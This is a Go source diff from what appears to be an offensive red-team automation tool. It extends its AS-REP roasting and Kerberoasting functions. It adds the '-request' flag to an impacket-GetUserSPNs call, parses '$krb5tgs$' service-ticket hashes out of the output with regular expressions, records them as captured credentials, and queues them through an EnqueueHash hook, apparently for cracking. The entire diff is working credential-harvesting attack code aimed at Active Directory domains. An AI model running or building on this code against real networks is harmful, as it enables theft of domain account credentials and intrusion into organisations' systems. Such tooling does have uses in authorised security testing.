@@ -75,6 +75,9 @@ func runASREPRoast(domain, user, pass, target string) *core.ToolResult {
 			Type: "hash", Username: username, Domain: userDomain,
 			Secret: m[0], Source: "asrep_roast",
 		})
+		if EnqueueHash != nil {
+			EnqueueHash("krb5asrep", m[0], username, userDomain)
+		}
 	}
 	fmt.Printf("[+] AS-REP: %d roastable users found\n", len(matches))
 	return result
@@ -87,6 +90,7 @@ func runKerberoast(domain, user, pass, target string) *core.ToolResult {
 	if target != "" {
 		args = append(args, "-dc-ip", target)
 	}
+	args = append(args, "-request")
 
 	r := utils.RunCommand("impacket-GetUserSPNs", args...)
 	if !r.Success {
@@ -95,9 +99,11 @@ func runKerberoast(domain, user, pass, target string) *core.ToolResult {
 		return result
 	}
 
+	// Parse SPN table rows
 	re := regexp.MustCompile(`^(\S+)\s+(\S+)`)
 	lines := strings.Split(r.Stdout, "\n")
 	inTable := false
+	tgsRe := regexp.MustCompile(`\$krb5tgs\$[^$]*\$([A-Za-z0-9._-]+)@([A-Za-z0-9.-]+)`)
 	for _, line := range lines {
 		trimmed := strings.TrimSpace(line)
 		if strings.HasPrefix(trimmed, "ServicePrincipalName") {
@@ -122,6 +128,55 @@ func runKerberoast(domain, user, pass, target string) *core.ToolResult {
 			Source: "kerberoast", Key: username + "@" + domain,
 			Value: spn, Timestamp: time.Now(),
 		})
+		// Check if the line also contains a TGS hash
+		tgsMatch := tgsRe.FindStringSubmatch(trimmed)
+		if len(tgsMatch) >= 3 {
+			hashUsername := tgsMatch[1]
+			hashDomain := strings.ToLower(tgsMatch[2])
+			result.Creds = append(result.Creds, core.Credential{
+				Type: "hash", Username: hashUsername, Domain: hashDomain,
+				Secret: tgsMatch[0], Source: "kerberoast",
+			})
+			if EnqueueHash != nil {
+				EnqueueHash("krb5tgs", tgsMatch[0], hashUsername, hashDomain)
+			}
+		}
+	}
+	// Also scan for TGS hashes anywhere in the output (impacket dumps them after the table)
+	tgsMatches := tgsRe.FindAllStringSubmatch(r.Stdout, -1)
+	for _, m := range tgsMatches {
+		if len(m) < 3 {
+			continue
+		}
+		hashUsername := m[1]
+		hashDomain := strings.ToLower(m[2])
+		// Dedup against already-captured users
+		alreadyCaptured := false
+		for _, u := range result.Users {
+			if u.Username == hashUsername {
+				alreadyCaptured = true
+				break
+			}
+		}
+		if alreadyCaptured {
+			continue
+		}
+		result.Users = append(result.Users, core.User{
+			Username: hashUsername, Domain: hashDomain,
+			Source: "kerberoast",
+		})
+		result.Creds = append(result.Creds, core.Credential{
+			Type: "hash", Username: hashUsername, Domain: hashDomain,
+			Secret: m[0], Source: "kerberoast",
+		})
+		result.Evidence = append(result.Evidence, core.EvidenceEntry{
+			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
+			Source: "kerberoast", Key: hashUsername + "@" + hashDomain,
+			Value: "Kerberoastable account", Timestamp: time.Now(),
+		})
+		if EnqueueHash != nil {
+			EnqueueHash("krb5tgs", m[0], hashUsername, hashDomain)
+		}
 	}
 	fmt.Printf("[+] Kerberoast: %d SPN accounts found\n", len(result.Users))
 	return result
